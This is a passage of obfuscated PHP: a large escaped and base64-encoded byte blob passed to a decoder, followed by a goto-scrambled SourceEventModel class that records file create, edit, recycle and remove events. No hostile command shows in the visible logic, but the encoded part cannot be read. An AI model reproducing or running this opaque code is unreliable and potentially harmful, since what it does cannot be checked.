bÖàh/Ä')."\212\132\66\121\270\137\361\220\56\354\223\304\245\57\210\253\35\242\47\320\344\322\125\355\20\334\350\162\70\66\170\33\132\364\212\354\231\35\252\160\66\65\173\352\234\200\364"."\x95\x57\x4e\x60\x1b\x50\x47\x18\xec\x40\x14\x97\xe4\x1\xa3\x82\xf2\xc5\x18\x32\x6e\x82\x94\xd0\xa8\x5\xe1\xe8\x5c\x1f\x84\xa3\xad\xbe\x37\x31\x10\xbb\xd0\x3\x92\x59\xc\x1e\xed\x51\x8e"."\7\103\155\310\203\201\234\207\307\141\354\232\211\236\230\47\144\326\140\330\15\374\225\257\336\71\171\353\235\223\257\336\71\266\172\347\344\326\213\101\66\44\225\63\231\72\354"."\353\127\244\46\26\120\124\14\120\212\333\15\217\56\305\3\120\42\203\142\303\53\27\210\256\307\314\137\214\245\67\370\27\133\10\335\302\22\261\24\347\242\226\57\224\300\33"."\224\300\47\145\303\234\145\361\340\361\253\236\62\341\55\362\146\306\256\63\36\313\255\31\206\33\172\5\103\234\45\73\151\17\204\250\322\315\332\47\174\332\52\110\207\304\117".base64_decode('EXPayFw6cr+PWFeCv73MsQJgkD1xeDkekDYyKt7BjGYoogvSmIK81LFbqIK/zpQ=').base64_decode('PAiJDzWFEDx3UqeWooswOGDOlMVz8KATdN3m6dJQlF4qCAnMMhNeW5kHS3t3ICk=')."\xe0\x74\x50\x67\xfe\x4e\xb1\x2e\xdd\x99\x17\xe0\x14\xee\x75\x63\x6a\x20\xf8\xbf\x5\xed\x22\x45\xc3\x66\x92\xf5\x9b\x40\x63\x43\x5\x5e\xfc\x33\x2f\x5f\xaf\x9d\x3a\x77\x32\xa\xe6\x12\x7b"."\xa6\x9e\xa1\xc\x51\x77\x9d\xb6\x15\x60\xf3\xf0\xd9\xd1\xd8\xd1\xdc\x11\x16\x87\xc9\xd4\xe5\xee\x6e\xd0\x6c\xc1\x69\xa0\xa5\x2d\xbf\xe4\x83\x94\x68\x8c\xc6\xe6\xf5\x3a\x4a\x22\x11\x7\xec"."\326\221\141\200\143\40\302\260\23\71\245\317\203\237\63\41\234\140\150\67\267\46\310\144\205\327\21\104\234\200\273\63\63\30\200\2\56\166\375\112\311\2\162\311\112\134\70"."\63\37\251\140\170\322\265\132\214\154\165\13\13\0\266\25\124\25\214\56\2\277\305\5\216\2\310\50\241\60\234\51\10\100\355\50\250\32\135\204\76\212\211\53\203\141\142".base64_decode('iCr4QOQnFES0rZFNU9Ct1aDRgOu73F3uHiBrvqYP1sh9sNvp/GAEkDZqHBERCSw=')."\41\335\144\324\305\230\46\326\22\112\172\233\353\53\51\245\364\64\317\163\162\257\244\123\153\6\123\111\211\110\75\325\205\145\256\322\102\211\272\360\257\56\154\13\67\70\47"."\x15\xd6\x4c\x3b\x6a\x6a\x1d\xd2\xb4\x9b\x4a\x33\x54\x95\x43\x8f\xaf\x58\x18\x9d\x46\x54\x63\x53\xe1\x12\x62\x1\xb7\x35\xb4\xbf\xbc\x84\x12\xa5\xe4\x61\x2d\xd\xb6\x33\x40\x85\x52\x2e\x6a"."\xf1\xdb\xc6\x28\x15\x77\x14\x9b\x56\xcc\x1\x4d\x27\xc7\x8\x84\x88\x96\x53\x3b\xf4\x84\x40\x5f\x52\x6\x5d\xbe\xe8\xf6\x74\x15\xd4\x95\xd1\xee\xb7\x65\x86\xb2\x69\x27\x14\x89\x9d\x21\xd1"."\321\225\315\61\165\251\65\75\24\152\255\351\105\362\27\345\44\42\305\77\261\43\361\52\111\364\56\57\270\341\164\302\175\37\257\74\252\137\41\60\110\31\51\110\265\32\330"."\160\262\27\261\222\275\351\266\366\302\241\166\2\136\12\342\77\130\124\140\213\65\225\174\111\254\56\314\355\216\315\355\243\200\262\300\311\165\212\36\323\7\1\43\15\243\241"."\257\145\47\234\137\47\365\334\225\33\303\27\165\336\246\106\11\252\344\113\322\226\125\143\366\52\321\311\215\63\233\245\25\346\55\124\144\363\151\2\324\11\37\53\317\302\160"."\3\1\335\311\170\154\73\317\56\350\60\163\275\25\203\305\53\225\217\257\252\234\14\376\22\362\110\17\236\262\31\263\232\175\122\157\306\43\335\335\224\16\160\177\347\264\157"."\160\302\55\56\234\5\60\37\106\266\302\51\1\261\244\343\255\265\170\313\47\35\305\362\243\340\270\32\51\133\361\112\202\47\261\21\346\10\74\17\45\215\51\344\246\210\232"."\x26\x5b\xab\x60\x9\xc8\x26\x24\x4e\x3f\x74\x96\x5e\xe6\x4b\xa4\x2b\xd9\xcb\x7b\xd2\x5\xd\xe2\x8\x86\xf7\x82\x86\x6a\x9c\x95\x42\xdb\xaa\xa0\xd9\x8c\x26\xb2\xe9\xde\x6a\x21\x52\x32\x35"."\x4d\x4a\xc9\xe9\x21\xc2\xe4\x8f\x31\xaa\xc6\x18\x53\x60\x45\xd5\x63\x5c\x15\xdd\x6\x8\x10\x7a\xcd\x9c\x38\xc2\x7d\x84\x7b\xec\xc2\x4e\x2a\x48\xc\x56\x2d\xbb\xa0\x97\x7d\x17\xdc\xa4\x82".base64_decode('WZKqNZllHtYz6Ju0sNXf1uhrEQ6PBUCkrr4l4mltzRvBmBKosIJHLq4e+ohIlGI=')."\325\124\65\25\227\242\320\264\264\272\0\102\13\44\103\217\122\127\226\5\156\102\107\121\2\56\26\115\125\111\226\102\230\105\352\6\150\342\104\137\70\272\160\332\124\267\72"."\x8d\xd\x36\x77\x9\xa2\x6b\xdc\x72\xd6\xe5\x1e\x5\x85\x24\x37\x3c\x97\x4d\x8f\x85\xb3\x2b\x1e\x13\x21\x68\x3\x77\x0\x22\x49\x53\x65\x9\x8f\x63\x75\x21\x3c\x34\xeb\x2e\x94\x12\x60\x3f".strrev('3ÂŒTWp°,Ü¬ôäëÑ®mD÷'."\r".'«Î4¦~¥Ë‹(Ô•ÂF,·TÅYè[™ìÓ\'–f')."\x89\x6c\x7b\x73\xd3\xbb\x91\x80\xef\xe6\x32\xa1\xf5\x78\x80\x69\xd4\xf3\x20\x85\x8b\xbd\x43\x92\x91\xa3\xbd\x10\xa3\x38\xf9\x27\x75\x92\x88\x56\x28\x86\xe0\x8\x8b\x43\x6f\x53\x38\x8\xcb".base64_decode('Qtt6pPTV+TsFCxfiguCOv3hxLozYz9ijPBnVDoKYY4dBSZrDwD5mrQZjrZiIQ2g=')."\x1a\xfc\xcb\xf3\xf8\x5b\x1a\x79\x0\x8b\x1d\x96\xc8\x76\x6a\xaa\x86\x42\x1d\xed\x85\xae\x92\xc5\x8b\xdd\x2a\x3d\x80\xee\x28\xb0\xe6\x75\xb1\xd4\x38\xdc\xe1\xb2\xa6\x7\x3d\x21\x43\xcf\x12"."\x12\x80\x3d\x25\xe6\x1f\xcf\x26\x8b\xef\x28\x77\x9\xb7\xe4\x67\x7\xcd\x12\x3c\x7d\xae\xae\x9e\xd6\xce\xce\x18\x3a\x69\x1c\x65\x2\xd5\xb2\x49\x74\xfa\x87\x13\xce\xf0\x6c\xf6\x59\xd7\xc2".base64_decode('2VyG5JieuJAWxGP1lVnTz/zp41EVvz2ZjBikz0ogfXdS7XKz1Y514K4oN2mnSRA=')."\255\261\301\341\51\261\55\2\332\205\43\160\77\40\206\200\353\352\261\303\101\131\14\310\76\246\32\121\135\315\230\26\72\205\337\317\52\100\57\40\364\310\375\62\116\122\40"."\xd1\xf7\x78\xa\x90\xbf\xe7\x2\x40\x97\x70\xc\x21\x8\xbc\x29\x53\x21\x1\x92\x74\x25\x59\x5d\x80\x9a\x6b\x24\x14\x5\xe4\x47\x24\x26\x5f\x25\x20\x63\x81\x44\xa9\x63\x4a\x66\x23\xa6\x9b"."\32\330\370\230\235\64\171\173\244\55\110\214\114\75\55\344\214\201\260\124\243\346\343\337\321\243\50\242\240\307\156\222\212\216\55\351\20\325\101\247\116\335\134\125\105\236\102"."\151\15\6\302\201\72\372\232\104\76\235\26\273\107\151\340\333\0\134\316\241\126\317\63\274\163\255\51\30\107\340\46\20\62\375\172\66\235\146\307\372\220\105\144\333\26\76"."\xb3\x9\x25\xb2\x26\xdf\xf0\xa0\x3b\xe8\x30\xbc\x25\x65\x10\xb0\xe0\x9e\xb\x3a\x7\x53\x62\x2e\x4b\x20\x4f\x32\x7c\xac\xe\xb\xa1\x6b\xc0\xa2\x97\xc0\xc5\x27\x35\xea\x94\xac\xbc\xb4\xb4"."\324\131\132\6\376\262\343\104\302\143\125\225\226\346\44\51\55\255\102\177\161\4\322\246\222\121\264\306\200\105\113\251\15\111\60\0\244\175\362\105\222\250\351\54\145\203\332"."\xeb\xa0\x51\xba\x4\x9b\xd6\x49\x77\x7e\xda\x7e\x30\x80\xe8\x62\x17\x5d\xf8\x53\x4\xe1\x6d\x8a\x84\x8e\xab\x48\x48\xb1\xf\x2\x3b\x7\x24\x53\x42\x77\x50\xb8\xd2\xe9\x37\xe0\x46\xc0\xf4"."\xa0\x41\x21\xed\x65\xf7\x11\x40\x32\x3e\xf1\x53\xf0\x5d\x93\x6a\xd6\x28\x6f\x3a\xd6\x2e\x56\xe6\xa2\x83\x8b\x81\xdc\x7b\xa9\x93\x46\x38\x45\x77\xe1\x24\x13\x26\xe9\xdc\xfa\xc1\xd2\x34\x90"."\x7\x6c\xa4\x51\xd6\x2b\x8\x10\xb4\x16\xe8\xce\x1b\xbb\x5\x80\x42\x49\x76\x13\x12\x6\x5b\x58\x52\xec\x64\x1e\xdf\x11\x21\x43\x92\x7\xc1\x12\xda\x40\x84\x6f\x86\x30\x78\x36\xb\xa1\x11"."\202\62\13\305\252\30\21\271\246\220\141\242\144\221\142\21\273\342\212\317\270\321\335\277\136\65\151\271\244\24\21\312\26\7\147\12\114\50\332\161\200\105\343\141\336\364\1"."\x6d\x82\x7c\x2f\x45\x1\xac\x60\xaf\xe6\xc3\xee\xe2\xc8\x83\xbc\x90\xa2\x77\xbc\xb0\x51\x4c\xd5\x51\x39\xb3\x63\xda\x67\x6\xd\xbb\xae\xf1\x1b\x47\x39\xf\xe2\xd1\x90\x70\xe1\x90\x2a\xa2"."\103\277\142\221\101\41\136\12\300\66\14\165\314\251\230\120\200\75\312\226\307\23\23\336\152\63\270\67\261\72\346\312\120\164\61\206\317\174\5\313\0\203\70\124\346\207\274"."\xb4\x8c\x7e\x41\xee\x70\x65\x74\x2d\xe\x26\xcb\x10\xfb\xa\xe0\xad\xf9\xc1\x2c\x79\x6e\xca\x3c\x89\x58\x87\xc4\x74\x22\x10\x9a\x1d\xd1\x67\xc3\x8\xde\xf1\xfb\x43\x32\x7f\xd0\x50\x48\xca"."\xaf\x37\x8\x40\xab\x61\x90\x10\x51\xc7\x9e\xae\x10\x81\x50\x8e\x11\x8f\xf5\xd1\xbd\x53\x6b\x19\x50\x40\xb2\x42\x58\xcb\x7e\x1\x57\xa8\x60\x6b\x92\x27\xe6\x84\x5b\x68\x24\x19\xa7\x4\x50"."\351\40\252\77\125\215\132\14\300\321\340\247\167\126\70\206\141\61\63\52\172\60\15\43\373\250\244\102\137\267\43\344\6\341\75\54\0\131\126\330\6\220\343\52\131\154\325"."\xd5\x62\x36\x6b\xdc\x7\x4b\xae\xa0\x1f\x2b\x68\x2a\x38\x84\x4c\x4b\x26\xaa\x88\xe1\xf0\x45\x44\xd\x0\x5c\x74\x4d\xec\x51\xb5\x3c\x48\x67\x45\xac\x1c\xc\x42\xa\x64\x58\x40\x15\xa3\x4f".base64_decode('QgiIP5RDitH29mUVytUJxEwyOSkjhCec0DXTFC8ee6idFAz4xT09jLM4p/F6LCc=')."\112\202\367\121\226\24\354\45\264\166\231\356\57\310\214\7\171\315\26\204\20\133\320\156\352\203\166\7\223\322\177\352\266\65\315\36\76\201\323\31\22\54\55\362\324\100\62".base64_decode('sSxkk9KVqKYjaVS4RZk2g0pcDPo1JoXDEwwlTxHwmryA4hALgHyYFS/dC15fQUg=')."\x70\xb3\x2b\x30\x1b\xce\x32\x89\x71\x29\x11\x5c\x32\xe\x8c\x13\x22\x50\xfa\x7c\xc\x8b\x4d\x17\x24\x18\x57\x22\xf1\x37\x94\xed\x62\x6a\x77\x1b\x1b\x41\xed\x35\x25\x71\x97\xa6\x6\x98\xb0"."\0\164\177\31\366\300\20\343\100\261\320\303\43\357\231\230\5\325\231\223\5\307\301\235\225\133\152\212\61\6\220\227\340\120\355\77\46\117\125\50\112\30\321\50\363\245\100".base64_decode('RocPEokYUqg1l7Os3Ek9Y4hGnGTzJeML+VsBDSAXTukgMc0i6XgaTXhcDd315dc=')."\x1a\xd1\xb5\x66\x36\x9f\xe8\xfe\x33\xb\xe9\xc2\xbe\xa5\x30\xb3\x2d\x74\x11\x58\x24\x2b\xfc\x58\x19\x5b\x73\xc1\x4\x6d\xf9\xe2\xf1\x8\xc1\xe8\x7a\x8b\xb1\x9b\x2d\x1\x58\x19\xd6\x78\xe2"."\312\67\145\171\54\27\340\201\305\142\302\126\10\161\327\54\272\50\106\271\170\77\270\335\40\0\151\330\141\260\60\60\374\170\34\137\221\246\6\217\214\56\161\160\130\143\300"."\334\43\166\27\63\370\44\167\131\310\53\146\105\305\360\56\213\105\347\321\74\304\356\44\200\231\354\205\233\4\263\272\63\304\0\215\145\310\151\130\2\330\112\305\222\233\201".base64_decode('WKoBhVxLYbJ5a1Orm4Fq6TCx26ZEsOPvYhH7LXIvZACMu0adsdRVMcMd+vjuQEo=')."\x8d\x4a\xfe\x40\xa3\xaf\xce\xe3\xaf\xf7\x85\x66\x48\x71\xc5\x14\x9e\x90\x46\x2e\xb9\xad\xcb\x1d\xa9\xab\xf0\xe4\x50\xcc\xef\x62\x5e\xa9\xe1\xa7\xb3\xb\x30\x9e\xce\x18\x63\xc7\xd\xce\x78"."\13\366\74\302\233\34\326\142\61\216\52\172\116\211\200\215\117\131\11\2\312\3\225\160\171\122\47\271\116\112\110\234\321\225\334\364\103\12\172\101\227\267\130\310\220\315\323"."\32\222\76\177\15\140\211\130\123\203\315\132\111\357\257\361\152\272\137\65\124\116\34\150\216\41\261\164\256\146\324\231\143\364\230\350\107\135\230\1\76\330\270\226\134\117\44"."\xc4\xf5\x82\xe8\x8e\xd7\x26\x36\xe3\x69\x12\x5d\xd6\x64\xa8\xd2\x9c\x3c\x7\xc5\x1d\xf1\xa3\xa0\xf0\x44\x42\x46\x97\x55\x43\x11\x0\xd8\x57\x7f\x9\xb1\x69\x97\x93\x49\xcb\x23\x47\xc9\x6e".base64_decode('IZi17rJ5q4rgCihM8IqTL0EQvk/7v26qGuP+ItQYPZ9ndvzY03Od+CAWrTPnGYg=')."\137\175\120\302\301\217\31\42\350\32\75\175\326\6\275\312\115\316\120\330\371\164\4\373\71\340\125\0\271\116\37\312\210\347\74\356\230\233\15\61\376\200\116\170\274\124\341".base64_decode('CwOcSYbJSWmwOiwmAaENHnhQdppqWwA9IONsOee0PY1hN+ezvEKbUwc0sNp/OSA=')."\x9f\xc4\x55\x11\x2c\x81\x54\x2d\x95\xe2\x37\x57\x98\x5b\x6d\x69\x2a\xbd\x47\xc4\xab\x40\xfe\x28\xbc\xa9\x8c\x69\x91\x4\x9b\x44\x73\x5c\x61\x88\x31\x0\x31\x2f\x9c\xfb\x87\xc6\x22\x5a\x6a"."\50\7\140\321\110\370\151\273\230\101\31\164\52\236\356\326\304\141\100\364\23\332\126\343\27\223\260\310\351\0\354\273\142\346\276\221\200\263\377\177\311\210\43\103\202\231\235".base64_decode('tZDcBhn23YtzUvD5h4Q2YH02CULsDz5YnnoQcB9dPhUfp6BPBAAm1fKOh1DgGPw=')."\323\101\176\351\236\142\57\32\123\21\122\173\61\103\225\272\204\232\214\351\314\336\201\3\232\25\56\75\242\134\360\310\137\246\317\362\261\27\174\70\226\61\147\361\314\71\74"."\137\240\350\51\231\372\375\244\263\201\45\253\227\174\376\370\0\337\357\254\356\331\331\41\37\63\373\102\346\167\242\373\377\260\26\226\343\16\314\151\101\12\305\103\265\103\342"."\xb7\x68\xe9\x88\x3a\xd\x22\xa9\x1e\x27\xc6\x26\x7d\x9a\x90\x80\xbe\xc5\x13\x73\xa0\x87\x62\x30\xd9\xb2\x7b\xad\x17\x96\x1b\xa3\x85\x62\xee\x78\x52\xeb\x92\x93\x41\x6c\x39\x64\x31\xc7\xd7"."\201\224\304\254\1\55\311\60\310\55\147\62\373\75\204\300\100\162\40\221\115\373\360\65\57\13\124\27\244\60\321\326\24\37\275\360\33\56\44\71\250\255\25\237\265\220\156".base64_decode('i0XS8y+mlGwQ3mx1556XQcsmQhxEwz9ydOkSxSSSQJoq8Qm2rEmIEIBXdaAPtOg=')."\x45\xb6\xfa\x17\xa0\xc\xf\xad\xef\x1a\x60\x84\x45\x3f\xf5\x4a\x37\x93\x31\x60\x98\xef\xaf\xe2\xe5\x56\x7e\x4e\x6e\x7f\x22\x87\x56\xc3\xde\xfb\x71\xe0\x9e\xf1\x67\xde\xf0\xeb\x3e\xe\xf6"."\222\217\3\173\43\162\220\367\173\34\374\246\322\57\75\215\300\237\142\264\276\337\10\333\314\54\345\162\230\175\73\237\317\206\312\226\41\150\37\270\260\226\253\375\343\247\204".strrev(']©ªR³0‘&'."\r".'—¯áŒòfq+ŞbíõR3 t¬ÃĞ°éÉîU€‚»ŸŠlé')."\72\75\147\262\47\123\55\130\27\321\25\156\261\217\175\143\345\74\301\61\67\25\53\37\137\71\131\124\32\360\371\341\347\67\304\37\132\5\376\41\73\77\237\161\311\212\117"."\22\165\310\45\256\133\24\151\265\145\315\175\150\313\106\201\377\167\230\317\71\156\234\124\260\54\315\175\257\60\147\4\20\22\12\366\30\302\376\145\73\174\327\340\231\270\301"."\227\17\336\261\370\363\132\326\272\360\36\236\247\37\302\276\303\127\2\176\357\110\113\102\331\65\5\365\257\246\56\133\205\260\174\262\6\32\11\52\330\250\350\61\121\305\336".base64_decode('djQwREvBowVhRCzR1OwqFpgd7ktIwxdIJ8kuC29g8jUlkJT/xQRSeQOLJtz0Ik8=').base64_decode('z93TKd3I856VcH79C+3GLBaTrZyy6RQQUlDLKWYATTBhVrioZ+2rrXiQjZfR6ZA=')."\366\227\50\227\317\22\236\275\342\176\50\4\16\13\346\246\127\275\366\43\51\123\342\44\76\350\145\46\270\50\200\127\250\145\265\12\156\356\304\273\57\250\40\161\31\344\26".base64_decode('jZQvpL1kuTaFw634epOnkV15kgXLGDh0wut1mvhtvU8coO7AAE9kEcNAuN72wCE=')."\x22\x39\xf6\x57\xf\x69\xff\xd1\x3a\xe7\x24\x4c\xb8\x3b\x67\x11\x16\xd8\x3\x35\x16\xe1\xc1\xb0\xbf\x1d\x5\xb8\x27\xd1\xbb\x1f\x8\x32\xc\x27\x7b\x25\xa1\x75\xc8\xe8\x18\xd7\xe6\xb0\x3f"."\22\232\21\256\16\333\336\74\26\364\240\326\327\214\55\127\14\241\307\4\333\262\246\27\27\15\333\213\156\330\331\32\376\246\214\367\377\357\307\222\376\157\275\221\124\131\112"."\65\326\226\367\21\33\11\77\113\231\257\141\301\267\43\326\226\332\372\141\335\21\311\103\334\374\105\120\41\314\54\53\251\327\14\352\114\103\246\47\54\162\62\151\77\156\314"."\221\0\162\236\222\3\310\327\313\336\77\313\27\310\175\342\325\202\147\224\223\24\336\17\125\243\275\171\216\3\341\150\373\255\256\6\205\375\77\47\31\47\105\200\115\240\356"."\103\334\364\53\12\5\50\310\44\122\12\50\136\202\13\144\250\250\125\114\210\156\347\164\112\51\320\265\132\102\60\104\42\141\1\345\220\226\260\145\14\55\100\161\170\370\3"."\xc9\xec\xf5\x55\x4b\x8e\x66\xdb\x63\x5a\x38\x91\x21\x8e\xad\x45\x2b\x9d\x7b\x3a\x9c\x9b\x9b\xad\x5b\x31\xb\x34\x40\xb5\x2a\x67\xd8\xeb\xa6\xa5\xf6\xe7\x4e\xcb\x9c\xb9\x95\x61\xfb\x6f\xa8".base64_decode('WAhCUZ7qWNDBBTpYzJMH41mIp9kPpudfb+wRMy7Pwi+xv3Tdtuoa4rWsUKbeEGw=')._kodDe('L3PuJZaNYqLB7wyw7452mHdhCTlZDKlaWTEdB0aV963xZ0zLkVQ7yZ/LOtgdD+yw')."\xf4\x96\x80\x2c\xca\x29\x43\xf4\x49\x6d\xcd\x9\x8d\xa9\xad\x2b\x65\x5a\xbe\x64\x51\x4d\x37\x84\x64\xc\x9e\x2f\x2d\x7c\xad\xd0\xb4\x8c\x26\xf7\x34\x6b\xf7\x30\x8b\x84\x5c\x2c\xb7\x5a\xc4"."\127\162\374\50\202\204\323\71\300\311\306\254\16\262\121\44\2\123\227\124\364\11\173\176\276\144\75\336\143\316\64\163\50\125\126\365\13\321\50\27\365\157\2\176\341\75\51"."\x1f\xbf\x38\x8e\xa2\xb1\x56\xdc\xd3\x2f\x9b\xf4\x90\xcc\x9e\xcb\xfa\x90\xa9\x70\x18\x18\x45\xb8\xe3\xcd\x3d\xef\xe1\xc7\x50\xc2\x3e\x4f\xb3\x41\x31\x83\x93\x60\x1b\x5c\xa0\xf3\x9c\xda\xc9"."\375\374\210\207\63\272\261\30\173\64\327\222\64\106\131\175\6\5\20\376\276\56\144\153\204\253\227\334\332\127\31\260\277\211\350\22\257\153\132\22\346\102\371\325\114\41\77"."\327\366\363\156\102\130\276\356\243\45\143\315\56\136\375\144\110\305\101\330\351\60\63\223\21\204\12\150\265\316\355\147\160\127\230\204\314\253\264\136\64\145\311\330\234\201\64".base64_decode('6I6A0wK1iUlQ30B3bFuUIb4HbD3jE0V2AQWUpF8oTjz/22+GUP5KOFZah1i4lMs=')."\x23\xe8\x66\xa5\x59\x6\x5f\x20\x76\xac\x63\x24\x65\x50\x8c\xb4\x34\xc7\x3e\xb5\x88\xc3\xe7\xe8\x8b\x81\x29\xa4\xd2\xc4\x71\x1e\x6b\x14\x4e\xaf\xd8\x5a\x2f\x66\xb0\xf7\xc\xe7\x30\x6\x54"."\x33\x9a\x10\xc4\x8e\xdc\xc8\x5c\xb8\x9e\x33\xa8\xa4\xa2\xfc\xed\xb5\xb7\x8a\x8e\xa9\x5d\x18\xe3\x85\xe4\xb4\x47\x30\x22\x8\x6b\x79\xf2\xe0\x16\xe5\xcd\x86\xa3\x60\x4e\xce\x2e\x5a\xf2\xee"."\147\10\140\136\34\5\363\346\104\323\314\202\356\102\310\147\312\131\143\77\335\313\35\74\42\320\307\362\164\330\46\366\342\244\373\33\317\274\211\163\253\43\30\147\117\215\64"."\0\371\133\301\5\167\333\101\155\276\126\344\115\274\337\126\344\171\211\233\270\372\312\103\153\151\114\36\352\312\117\365\163\351\70\217\313\143\143\200\313\204\173\264\350\131\46"."\x4f\xb4\x68\xb0\x90\xdf\xa4\x21\x98\x77\xe9\x1b\x56\x5b\x3\x1b\x5c\x1c\x18\x6a\x77\x4\x84\x33\xfe\xb6\xb3\x60\xa1\x3b\xc6\x42\xd2\xb3\xe9\xde\xb4\xc6\xb6\x89\x18\xb7\xe\x83\xc6\xa7\xec"."\65\144\126\135\116\151\126\324\114\147\5\273\321\274\6\303\16\50\112\347\12\255\111\231\352\300\5\113\153\54\265\150\246\32\25\354\235\270\325\51\353\246\312\331\370\244\240".base64_decode('a7OpubhgbznyzqMIQiDCrnF1ssXuHO//RI+OT9Pq4OErO0KB4pUD75c4OqTppgM=').base64_decode('xoW1DPqt1UyTHxJjcRkxeXDTcwi2DuCLn5fAUUQqfISOiGygT3KuB+XQkIJjEbE=')."\xb1\x4\xe0\xd1\x0\xb\x88\x7b\x1a\x39\xdf\x6b\xc8\xda\x4e\x20\x39\x0\x8\x91\x5d\xda\x20\x75\xe3\x6\xef\xb3\xf2\xf6\xf0\x47\x94\x65\x3b\x23\xc7\x79\x10\x82\x6f\xa2\xe5\x6\xba\x35\x6c".strrev('«TNPáBøçzÄ]ƒH˜Ç`Eä†¢©,À?’ÜL®È2¢uÀ8›Œq¸').base64_decode('JxSaHQjWYz+aOdEol2AkkxPV2hRo2V+ct9nj8+fEQaOZlgj384OjfK2olR6/PzA=').strrev('ûÕ‡ØĞ¾ Õç"ªÇ\'Ã¸¤§'."\n".'¼JpI9!ÿµMiThI»\\¦‡A-àÍÕğ­{')."\274\315\176\215\42\54\51\10\32\274\264\220\262\203\31\2\205\176\105\331\342\146\314\62\352\220\150\47\307\217\205\135\226\343\143\1\216\26\13\42\61\2\22\212\273\53\2"."\224\344\35\61\121\125\232\253\272\107\261\174\104\140\113\317\326\210\211\125\217\326\45\250\346\261\354\102\356\247\221\61\26\254\234\360\67\211\376\77\202\132\37\111\134\242\0".base64_decode('AA==').""."", 10, -8))); goto açŒ«­Â¦; bÊ¡ˆ·¾ÒÚ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\x63\145\x5f\145\x76\145\x6e\164"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\124\x69\155\x65", "\x74\x69\155\145", "\x69\x6e\163\x65\162\164", "\x66\x75\156\x63\x74\151\157\x6e"), array("\144\x65\163\x63", '', "\x69\156\163\x65\x72\164\x2c\165\x70\x64\141\164\x65\x2c\x73\x65\x6c\145\143\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($A‚äîæà¸­, $c·Ì¿õ†Û³, $b ã¿©Ö“­ = '') { goto f’ÇŒâ‚ïõ; E¥ÎœŸ‘œ: if (!$C–‹¯İÑ‰) { return !1; } if ($this->isCacheEvent($C–‹¯İÑ‰, $c·Ì¿õ†Û³)) { return; } if ($b ã¿©Ö“­ && is_string($b ã¿©Ö“­)) { $b ã¿©Ö“­ = array($A¼ÖòĞ“Ñå[1768] => $b ã¿©Ö“­); } goto c¹™”˜Óê–; f’ÇŒâ‚ïõ: $A¼ÖòĞ“Ñå =& $_SERVER[Ö‘Øù]; if (!$this->eventSave) { return; } $C–‹¯İÑ‰ = Model($A¼ÖòĞ“Ñå[1240])->sourceInfo($A‚äîæà¸­); goto E¥ÎœŸ‘œ; c¹™”˜Óê–: $F£ÙŒ¥ïŞ = array($A¼ÖòĞ“Ñå[412] => $A‚äîæà¸­, $A¼ÖòĞ“Ñå[1941] => $C–‹¯İÑ‰[$A¼ÖòĞ“Ñå[493]], $A¼ÖòĞ“Ñå[1942] => $C–‹¯İÑ‰[$A¼ÖòĞ“Ñå[28]], $A¼ÖòĞ“Ñå[514] => !empty($C–‹¯İÑ‰[$A¼ÖòĞ“Ñå[514]]) ? $C–‹¯İÑ‰[$A¼ÖòĞ“Ñå[514]] : $A¼ÖòĞ“Ñå[33], $A¼ÖòĞ“Ñå[1552] => USER_ID, $A¼ÖòĞ“Ñå[417] => $c·Ì¿õ†Û³, $A¼ÖòĞ“Ñå[1554] => $b ã¿©Ö“­); $this->addSystemLog($c·Ì¿õ†Û³, $F£ÙŒ¥ïŞ); unset($F£ÙŒ¥ïŞ[$A¼ÖòĞ“Ñå[1942]], $F£ÙŒ¥ïŞ[$A¼ÖòĞ“Ñå[514]]); goto dÈÕÏ…“º÷; dÈÕÏ…“º÷: return $this->add($F£ÙŒ¥ïŞ); goto F¤‚ ÍÓìŠ; F¤‚ ÍÓìŠ: } private function addSystemLog($EùíàÃ°ñ, $BÕËÁÙÓ) { $dÓªù¦‡ÎË =& $_SERVER[Ö‘Øù]; if ($EùíàÃ°ñ == $dÓªù¦‡ÎË[1943]) { $EùíàÃ°ñ = $BÕËÁÙÓ[$dÓªù¦‡ÎË[446]][$dÓªù¦‡ÎË[1944]]; } else { if (in_array($EùíàÃ°ñ, array($dÓªù¦‡ÎË[1707], $dÓªù¦‡ÎË[1945]))) { $EùíàÃ°ñ = $BÕËÁÙÓ[$dÓªù¦‡ÎË[446]][$dÓªù¦‡ÎË[748]]; } } $BÈí‚¶ó¢ï = array_merge($BÕËÁÙÓ, array($dÓªù¦‡ÎË[1946] => $BÕËÁÙÓ[$dÓªù¦‡ÎË[397]], $dÓªù¦‡ÎË[1947] => $BÕËÁÙÓ[$dÓªù¦‡ÎË[1947]])); Model($dÓªù¦‡ÎË[1671])->addLog($dÓªù¦‡ÎË[1948] . $EùíàÃ°ñ, $BÈí‚¶ó¢ï); } private function isCacheEvent($bå†ôç–…Ñ, $dÅÒéĞîè±) { if ($bå†ôç–…Ñ[$_SERVER[Ö‘Øù][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($AÊ”š”Â†, $fÕØŒÛõ) { $Dí–åØñ™µ =& $_SERVER[Ö‘Øù]; $aµâÔÆØá = Model($Dí–åØñ™µ[1240])->sourceInfo($AÊ”š”Â†); $eØ’ƒÒÖ¼ = array($Dí–åØñ™µ[1944] => $fÕØŒÛõ, $Dí–åØñ™µ[28] => $aµâÔÆØá[$Dí–åØñ™µ[28]]); return $this->addEvent($AÊ”š”Â†, $Dí–åØñ™µ[1943], $eØ’ƒÒÖ¼); } public function eventFileEdit($fÊ«±…ë÷) { $dâÁßõî¨¤ =& $_SERVER[Ö‘Øù]; $BÄ†º¸£‡ = array($dâÁßõî¨¤[1949] => $_SERVER[$dâÁßõî¨¤[1950]], $dâÁßõî¨¤[1951] => strtolower(ACTION)); return $this->addEvent($fÊ«±…ë÷, $dâÁßõî¨¤[1697], $BÄ†º¸£‡); } public function eventRecycle($bõŸ—ÍÉ‚º, $D”»›î„‹ˆ) { return $this->addEvent($bõŸ—ÍÉ‚º, $_SERVER[Ö‘Øù][1945], $D”»›î„‹ˆ); } public function eventRemove($F‹‘¹ŠĞ¯) { $Dò§«÷ İÇ =& $_SERVER[Ö‘Øù]; $Dç±Ñ¾¶¹‹ = Model($Dò§«÷ İÇ[1240])->sourceInfo($F‹‘¹ŠĞ¯); $Cï×¥©ÆèØ = $Dç±Ñ¾¶¹‹[$Dò§«÷ İÇ[28]]; return $this->addEvent($Dç±Ñ¾¶¹‹[$Dò§«÷ İÇ[493]], $Dò§«÷ İÇ[1696], 